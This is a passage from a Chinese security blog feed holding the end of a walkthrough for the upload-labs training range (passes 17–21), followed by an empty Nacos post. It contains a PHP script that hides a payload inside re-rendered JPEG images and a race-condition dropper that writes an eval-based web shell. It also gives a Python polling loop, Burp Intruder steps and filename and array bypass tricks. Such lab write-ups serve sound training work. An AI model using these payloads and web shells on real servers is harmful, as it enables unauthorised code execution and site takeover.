invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用方法：先上传一张jpg图片到靶场，再下载渲染后的照片命名为<code>1.jpg</code>，运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php jpg_payload.php 1.jpg</span><br></pre></td></tr></table></figure><p>就可以得到payload的jpg图片了，但是需要多次尝试，因为有的jpg图片不能被修改</p><h4 id="pass-18（条件竞争）"><a href="#pass-18（条件竞争）" class="headerlink" title="pass-18（条件竞争）"></a>pass-18（条件竞争）</h4><p><strong>条件竞争原理：</strong></p><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><p>上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。<br>由于服务器并发处理(同时)多个请求，假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a用户上传的文件，会有以下三种情况：<br>  1.访问时间点在上传成功之前，没有此文件。<br>  2.访问时间点在刚上传成功但还没有进行判断，该文件存在。<br>  3.访问时间点在判断之后，文件被删除，没有此文件。<br><strong>条件竞争绕过：</strong></p><p>修改木马如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;a.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个木马会生成在后台生成一个一句话木马<code>a.php</code>，接下来我们要并发的去访问这个文件，需要用bp一直去发包，然后利用python脚本去监听是否访问到了该文件。bp发包如下：</p><p>先抓包，然后右键送到<code>Intruder</code>模块，然后<code>clear $</code><br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407252217368.png" alt="image-20240725221743994"></p><p>选择<strong>payload type</strong>为<code>Null payloads</code>，同时将<strong>payload setting</strong>选为<code>continue indefinitely</code><br>接着运行python脚本，xxx表示自己的靶场地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://xxx.xxx.xxx.xx/upload-labs/upload/shell.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> ( <span class="string">&#x27;Warning&#x27;</span>  <span class="keyword">not</span> <span class="keyword">in</span>  <span class="built_in">str</span>(html.text)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>等到输出ok的时候就可以访问，用蚁剑连接的时候访问a.php就行了<br><strong>ps：</strong>条件竞争可能不成功，需要多试几次</p><h4 id="pass-19（条件竞争）"><a href="#pass-19（条件竞争）" class="headerlink" title="pass-19（条件竞争）"></a>pass-19（条件竞争）</h4><p>此关和<strong>pass-18</strong>类似，只不过本关需要上传的是图片码而非木马，故先制作图片码，<strong>shell.php</strong>使用<strong>pass-18</strong>的木马即可。其余和<strong>pass-18</strong></p><p>相仿，不再赘述。</p><h4 id="pass-20（-绕过）"><a href="#pass-20（-绕过）" class="headerlink" title="pass-20（/.绕过）"></a>pass-20（/.绕过）</h4><p>本关上传文件名可控，由于<code>move_uploaded_file()</code>有一个特性，会忽略掉文件末尾的 <code>/.</code>所以直接在保存文件名称的时候在最后加上<code>/.</code><br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407272316362.png" alt="image-20240727231610216"></p><p>连接的时候用<code>upload-19.php</code>就行</p><h4 id="pass-21（数组绕过）"><a href="#pass-21（数组绕过）" class="headerlink" title="pass-21（数组绕过）"></a>pass-21（数组绕过）</h4><p>本关包含了后缀名验证、<strong>MIME</strong>验证以及数组绕过<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407272339502.png" alt="image-20240727233907354"></p><p>原理我也没搞太懂，先记录下来</p><h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><p>文件上传分为两大类：<strong>前端验证</strong>和<strong>后端验证</strong>。<br><strong>前端验证</strong>的安全性远远低于<strong>后端验证</strong>，而后端验证又分为<strong>白名单</strong>和<strong>黑名单</strong>，<strong>白名单</strong>的安全性大于<strong>黑名单</strong>，下图为文件上传思维导图</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407272342961.png" alt="image-20240727234236167"></p><p>自己写代码的时候注意多使用白名单过滤，以免留多的后门。</p><p><strong>完结撒花</strong></p></div>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 基本漏洞 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nacos漏洞</title>
      <link href="/2024/07/18/Nacos%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/07/18/Nacos%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"><p>test</p></div>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 框架漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
